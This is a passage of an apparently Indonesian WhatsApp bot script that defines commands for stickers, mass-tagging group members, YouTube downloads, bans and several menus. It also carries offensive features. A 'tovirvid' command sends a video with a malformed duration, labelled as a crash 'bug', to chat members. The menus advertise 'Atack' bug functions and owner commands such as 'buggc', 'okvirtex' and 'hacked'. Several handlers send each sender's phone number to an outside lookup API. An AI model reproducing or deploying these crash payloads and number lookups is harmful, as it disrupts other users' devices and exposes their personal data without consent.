            file = await KonX.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await KonX.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            KonX.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmediau = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await KonX.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await KonX.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            KonX.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await KonX.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await KonX.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4', duration: 359996400,
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            KonX.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
         } else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await KonX.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await KonX.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/gif',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            KonX.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedDocument) && args.length == 0) {
            encmediau = isQuotedDocument ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await KonX.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await KonX.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'text/plain',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            KonX.sendMessage(from, ini_buffer, document, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await KonX.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await KonX.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4', duration: 359996400,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            KonX.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/dokumen/gif/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
				case 'tovirvid':
			if (!isGroup) return reply(mess.only.group)
			if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await KonX.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await KonX.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4', duration: 359996400,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            KonX.sendMessage(from, ini_buffer, video, {quoted: mek, thumbnail:virgam, caption: 'Nih Videonya\n\n⚠️*Perhatian.!!*⚠️\nVideo ini Mengandung Virvid/Bug SW!!'}, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply Video ${prefix}tovirvid`)
        }
        break
              case 'dadu':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
			random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./sticker/${random}.webp`)
			KonX.sendMessage(from, damdu, sticker, {quoted: mek})
			break
			case 'ytdl':
     case 'youtube':       
     case 'youtubedl':
        case 'ytmp3' :
         case 'ytmp4':
             //if (!isRegister) return reply(mess.only.regis)      	                              
             if (args.length < 1) return reply(`Kirim perintah *${prefix}play query`)
             reply(mess.wait)
             let yut = await yts(c)
             yta(yut.videos[0].url)             
             .then(async(res) => {
             const { thumb, title, filesizeF, filesize } = res
             const capti = `*YOUTUBE DOWNLOADER*
		     
•💬 Judul : ${yut.all[0].title}
•🎥 ID Video : ${yut.all[0].videoId}
•⏰️ Diupload Pada : ${yut.all[0].ago}
•👁️️ Views : ${yut.all[0].views}
•▶️ Durasi : ${yut.all[0].timestamp}
•📍 Channel : ${yut.all[0].author.name}
•🔗 Link Channel : ${yut.all[0].author.url}`
             ya = await getBuffer(thumb)
             py =await KonX.prepareMessage(from, ya, image)
             gbutsan = [{buttonId: `${prefix}buttonmusic ${yut.all[0].url}`, buttonText: {displayText: '🎵AUDIO'}, type: 1},{buttonId: `${prefix}buttonvideo ${yut.all[0].url}`, buttonText: {displayText: '🎥VIDEO'}, type: 1}]
             gbuttonan = {
             imageMessage: py.message.imageMessage,
             contentText: capti,
             footerText: 'Silahkan Pilih Jenis File Dibawah Ini☕',
             buttons: gbutsan,
             headerType: 4
}
             await KonX.sendMessage(from, gbuttonan, MessageType.buttonsMessage)})
             break                                                        
      case 'buttonmusic':
             //if (!isRegister) return reply(mess.only.regis)      	     
             if(!c) return reply('linknya?')              
             res = await yta(`${c}`).catch(e => {
             reply('```[ ! ] Error Saat Mengirim Audio```')})
             sendMediaURL(from, `${res.dl_link}`,{quoted:mek})
             break         
     case 'buttonvideo':
             //if (!isRegister) return reply(mess.only.regis)      	     
             if(!c) return reply('linknya?')            
             res = await ytv(`${c}`).catch(e => {
             reply('```[ ! ] Error Saat Mengirim Video```')})
             sendMediaURL(from, `${res.dl_link}`,'Nih Kack')
             break					            
			case 'd':
				case 'del':
				case 'delete':
					KonX.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
				case 'colong':
		if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}colong*`)
		const encmediia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	        const meidia = await KonX.downloadAndSaveMediaMessage(encmediia, `./sticker/${sender}`)
		    exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
		    if (error) return reply('error')
		    KonX.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), MessageType.sticker, {quoted: mek})
					fs.unlinkSync(meidia)
					fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
				})
				break
				case 'readmore':
			    	case 'more':
			    	const more = String.fromCharCode(8206)
			    	const readmore = more.repeat(4001)
				    if (!c.includes('|')) return  reply(mess.error.api)
                    const text1 = c.substring(0, c.indexOf('|') - 0)
                    const text2 = c.substring(c.lastIndexOf('|') + 1)
                    reply( text1 + readmore + text2)
                    break
                    case 'delchat':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                reply('Sukses menghapus chat' + from)
                await sleep(4000)
                KonX.modifyChat(from, ChatModification.delete)
                break
				case 'clearall':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					anu = await KonX.chats.all()
					KonX.setMaxListeners(10)
					for (let _ of anu) {
						KonX.deleteChat(_.jid)
					}
					reply('Sukses membersihkan semua pesan')
					break
					case 'mute':
			    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
			    if (!isGroup) return reply(mess.only.group)
                if (isMuted) return reply(`udah mute`)
                mute.push(from)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                reply('Bot berhasil dimute di chat ini')
                break
                case 'getpict':
				case 'getpic':
					case 'getpp':
					if (!isGroup) return reply(mess.only.group)
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            pictt = await KonX.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            KonX.sendMessage(from, pict, image, {quoted: mek})
            break
            case 'ban': case 'banned': case 'block':
          if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
          bnnd = `${args[0].replace('@', '')}@s.whatsapp.net`
					banned.push(bnnd)
					fs.writeFileSync('./database/banned.json', JSON.stringify(banned))
					fakestatus(`Nomor ${bnnd} telah dibanned!`)
          break

        case 'unban': case 'unbannned': case 'unblock':
          if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
          ya = `${args[0].replace('@', '')}@s.whatsapp.net`
					unb = banned.indexOf(ya)
					banned.splice(unb, 1)
					fs.writeFileSync('./database/banned.json', JSON.stringify(banned))
					fakestatus(`Nomor ${ya} telah di unban!`)
          break
          case 'sgif':
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await KonX.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											KonX.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await KonX.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							reply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											KonX.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else {
							reply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
						}
						break
            case 'wm':
            case 'stickerwm':
					case 'swm':
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							ppp = `${args.join(' ')}`
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await KonX.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							const packname1 = ppp.split('|')[0]
							const author1 = ppp.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											KonX.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
											fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							wmsti = body.slice(11)
							if (!wmsti.includes('|')) return reply(`Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`)
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await KonX.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							const packname1 = wmsti.split('|')[0]
							const author1 = wmsti.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							reply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											KonX.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
											fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else {
							reply(`Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
						}
						break
 case 'owner3':
let ini_list = []
for (let i of nomorowner1) {
const vname = KonX.contacts[i] != undefined ? KonX.contacts[i].vname || KonX.contacts[i].notify : undefined
ini_list.push({
"displayName": 'ItsMeVall',
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${KonX.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
hehe = await KonX.sendMessage(from, {
"displayName": `${ini_list.length} kontak`,
"contacts": ini_list 
}, 'contactsArrayMessage', { quoted: mek })
KonX.sendMessage(from,'Ini Kontak Owner Ku',text,{quoted: mek})
break
case 'comand':
case 'simpelmenu':
case 'command1':
case 'command':
case 'listmenu':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
 listMsg = {
 buttonText: 'KLIK DISINI',
 footerText: 'MENU BUTTON︎',
 description: `Hai kak @${sender.split('@')[0]}, Silahkan pilih menu disini`,
 sections: [
                     {
                      "title": `${jam} - ${week} ${weton} - ${date}`,
 rows: [
                          {
                              "title": "Script",
                              "description" :"🚪Membuka fitur scrit bot ini🚪",
                              "rowId": ""
                           },
                           {                         
                              "title": "Atack",
                              "description" :"🤡Membuka fitur bug bot whatsapp🤡",
                              "rowId": ""
                              },
                           {                         
                              "title": "store",
                              "description" :"🤡Membuka fitur Store🤡",
                              "rowId": ""
                           },
                           {                             
                              "title": "Speed",
                              "description" :"💬Membuka fitur respon bot💬",
                              "rowId": ""
                           },
                           {
                              "title": "Status",
                              "description" :"✅Membuka fitur status bot✅",
                              "rowId": ""
                           },
                           {
                              "title": "Creator",
                              "description" :"👑Membuka fitur creator bot ini👑",
                              "rowId": ""
                           },
                           {
                              "title": "Jadibot",
                              "description" :"🍃Membuka fitur jadi bot,tetapi tidak bisa membuat bot di dalam bot🍃",
                              "rowId": ""
                           },
                           {
                              "title": "Runtime",
                              "description" :"⏰Membuka fitur bot dalam waktu yang tidak menentu untuk slalu online⏰",
                              "rowId": ""
                           },
                           {
                              "title": "OwnerMenu",
                              "description" :"📙Membuka fitur khusus owners📙",
                              "rowId": ""
                           },
                           {
                              "title": "MakerMenu",
                              "description" :"💫Membuka fitur maker💫",
                              "rowId": ""
                           },
                           {
                              "title": "GroupMenu",
                              "description" :"👥Membuka fitur group👥",
                              "rowId": ""
                           },
                           {
                              "title": "OtherMenu",
                              "description" :"🗿Membuka fitur other🗿",
                              "rowId": ""
                           },
                           {
                              "title": "DownloadMenu",
                              "description" :"🖥️Membuka fitur downloader🖥️",
                              "rowId": "d"
                           },
                           {
                              "title": "ScBot",
                              "description" :"📲Membuka fitur untuk mendapatkan sc ini 🗿📲",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
KonX.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]},quoted:mek})
break
case 'downloadmenu':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
✩ 𝗛𝗮𝗶 𝗞𝗮𝗸 @${sender.split("@")[0]}
│
│シ︎𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥𝘦𝘳 𝘔𝘦𝘯𝘶シ︎
│
│>🍃${prefix}𝙮𝙩𝙢𝙥4 𝙡𝙞𝙣𝙠
│>
│>🍃${prefix}𝙮𝙩𝙢𝙥3 𝙡𝙞𝙣𝙠
│>
│>🍃${prefix}𝙥𝙡𝙖𝙮 𝙦𝙪𝙚𝙧𝙮
│>
│>🍃${prefix}𝙞𝙣𝙨𝙩𝙖𝙜𝙧𝙖𝙢 <𝙪𝙧𝙡>
│>
│>🍃${prefix}𝙩𝙬𝙞𝙩𝙩𝙚𝙧 <𝙪𝙧𝙡>
│>─❒
`
sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}command`,buttonText:{displayText:'𝙈𝙚𝙣𝙪 シ︎'},type:1},{buttonId:`${prefix}credit`,buttonText:{displayText:'𝙏𝙝𝙖𝙣𝙠𝙨 𝙏𝙤☻︎'},type:1},{buttonId:`${prefix}script`,buttonText:{displayText:'𝙎𝙘𝙧𝙞𝙥𝙩 シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'groupmenu':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
✩ 𝗛𝗮𝗶 𝗞𝗮𝗸 @${sender.split("@")[0]}
│
│シ𝘎𝘳𝘰𝘶𝘱 𝘔𝘦𝘯𝘶︎シ
│
│🍃${prefix}grup [3 Button]
│
│🍃${prefix}promote <reply chat member>
│
│🍃${prefix}demote <reply chat member>
│
│🍃${prefix}setdesc

│🍃${prefix}nsfw 1/0
│
│🍃${prefix}setname
│
│🍃${prefix}kick <reply/tag member>
│
│🍃${prefix}add <reply/tag member>
│
│🍃${prefix}getbio <reply chat member>
│
│🍃${prefix}getname <reply chat member>
│
│🍃${prefix}reminder <msg/2s>
│
│🍃${prefix}listonline
│
│🍃${prefix}sider [reply chat bot]
│
│🍃${prefix}antilink
│
│🍃${prefix}tod 
│
│🍃${prefix}tospam jumlah
│
│🍃${prefix}antihidetag
│
│🍃${prefix}antiviewonce
│
│🍃${prefix}autojoin
│
│🍃${prefix}antivirtex
│
│🍃${prefix}kickarea
│>─❒
`
sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}command`,buttonText:{displayText:'𝙈𝙚𝙣𝙪 シ︎'},type:1},{buttonId:`${prefix}credit`,buttonText:{displayText:'𝙏𝙝𝙖𝙣𝙠𝙨 𝙏𝙤☻︎'},type:1},{buttonId:`${prefix}script`,buttonText:{displayText:'𝙎𝙘𝙧𝙞𝙥𝙩 シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'menu':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
╭❒ ——— Menu? ————— ❒
│ᵐᵉⁿᵘ ᵐᵉⁿᵍᵍᵃⁿᵗⁱ ᵏᵉᵗⁱᵏ ¹
└────────────✧
`
sendButLocation(from, `${menu}`,`𝗛𝗮𝗶 𝗞𝗮𝗸 @${sender.split("@")[0]} Silahkan ketik Menu\nAtau tekan button di bawah ini🗿`, {jpegThumbnail:iye}, [{buttonId:`${prefix}1`,buttonText:{displayText:'𝓜𝓮𝓷𝓾'},type:1},{buttonId:`${prefix}credit`,buttonText:{displayText:'𝙏𝙝𝙖𝙣𝙠𝙨 𝙏𝙤☻︎'},type:1},{buttonId:`${prefix}script`,buttonText:{displayText:'𝕾𝖈𝖗𝖎𝖕𝖙︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'ownermenu':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6281212083401@s.whatsapp.net"
        dtod = '6281212083401'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
✩ 𝗛𝗮𝗶 𝗞𝗮𝗸 @${sender.split("@")[0]}
│
│シ︎𝘖𝘸𝘯𝘦𝘳 𝘔𝘦𝘯𝘶シ
│
│🍃${prefix}off
│
│🍃${prefix}isbaileys
│
│🍃${prefix}banchat
│
│🍃${prefix}unbanchat
│
│🍃${prefix}listbc
│
│🍃${prefix}antidelete on|off
│
│🍃${prefix}autoketik on| off
│
│🍃${prefix}autoread gc on / gc off
│
│🍃${prefix}autovn on / off
│
│🍃${prefix}antical on | off
│
│🍃${prefix}getcaption
│
│🍃${prefix}bugkatalog
│
│🍃${prefix}buggc [id grup]
│
│🍃${prefix}okvirtex
│
│🍃${prefix}on
│
│🍃${prefix}status
│
│🍃${prefix}setthumb
│
│🍃${prefix}settarget
│
│🍃${prefix}setfakeimg
│
│🍃${prefix}bc
│
│🍃${prefix}setreply
│
│🍃${prefix}hacked
│
│🍃${prefix}setprefix
│
│🍃${prefix}mode [2 Button self/public]
│
│🍃${prefix}term <code>
│
│🍃${prefix}eval <code>
│
│🍃${prefix}colongsw [reply sw]
│>─❒
`
sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}command`,buttonText:{displayText:'𝙈𝙚𝙣𝙪 シ︎'},type:1},{buttonId:`${prefix}credit`,buttonText:{displayText:'𝙏𝙝𝙖𝙣𝙠𝙨 𝙏𝙤☻︎'},type:1},{buttonId:`${prefix}script`,buttonText:{displayText:'𝙎𝙘𝙧𝙞𝙥𝙩 シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'storemenu':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
│ ⬣ 𝙎𝙏𝙊𝙍𝙀 𝙈𝙀𝙉𝙐 シ︎
│ 
│>🍃 ${prefix}diamondml
│>🍃 ${prefix}diamondff
│>🍃 ${prefix}sesi
│>🍃 ${prefix}pushkon
│>🍃 ${prefix}host
│>🍃 ${prefix}vps
│>🍃 ${prefix}upgopay
│>🍃 ${prefix}jasher
│>🍃 ${prefix}following
│>🍃 ${prefix}logo
│>🍃 ${prefix}unchek
│>🍃 ${prefix}smtp
`
